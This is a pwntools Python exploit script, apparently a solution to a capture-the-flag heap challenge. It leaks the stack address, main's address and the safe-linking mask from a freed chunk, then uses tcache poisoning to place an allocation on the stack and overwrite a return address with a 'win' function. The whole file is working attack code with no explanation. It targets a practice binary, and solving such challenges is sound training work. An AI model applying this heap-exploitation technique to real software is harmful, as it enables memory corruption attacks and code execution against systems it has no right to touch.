from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process("/challenge/safely-stack-summoning-easy")
def malloc(idx,size):
    p.sendlineafter("quit):","malloc "+str(idx)+" "+str(size))
def free(idx):
    p.sendlineafter("quit):","free "+str(idx))
def scanf(idx,payload):
    p.sendlineafter("quit):","scanf "+str(idx))
    p.sendline(payload)
def echo(idx,l):
    p.sendlineafter("quit):","echo "+str(idx)+" "+str(l))
def qt():
    p.sendlineafter("quit):","quit")
def puts(idx):
    p.sendlineafter("quit):","puts "+str(idx))
def send_flag(secret):
    p.sendlineafter("quit):","send_flag")
    p.sendline(secret)
def get_canary():
    scanf(0,b'a'*9)
    puts(0)
    p.recvuntil("Data: aaaaaaaaa",drop=True)
    canary=u64(b'\x00'+p.recv(7))
    print("[+]Canary:",hex(canary))
    return canary

offset=280
p.recvuntil("stack address of your allocations is at: 0x",drop=True)
stack_addr=int(p.recv(12),16)
print("[+]Stack_addr:",hex(stack_addr))
p.recvuntil("The address of main is at: 0x",drop=True)
main_addr=int(p.recv(12),16)
print("[+]Main_addr:",hex(main_addr))
main_base=0x151b
win_base=0x1417
win_addr=main_addr-main_base+win_base
l=100
malloc(0,l)
malloc(1,l)
free(0)
puts(0)
p.recvuntil("Data: ",drop=True)
mask=u64(p.recvuntil("\n",drop=True).ljust(8,b'\x00'))
print("[+]Mask:",hex(mask))
free(1)
scanf(1,p64((stack_addr)^mask))
malloc(0,l)
malloc(0,l)
scanf(0,p64(stack_addr)+p64(stack_addr+offset))
scanf(1,p64(win_addr))
qt()
p.recvuntil("pwn")
print(p.recv())
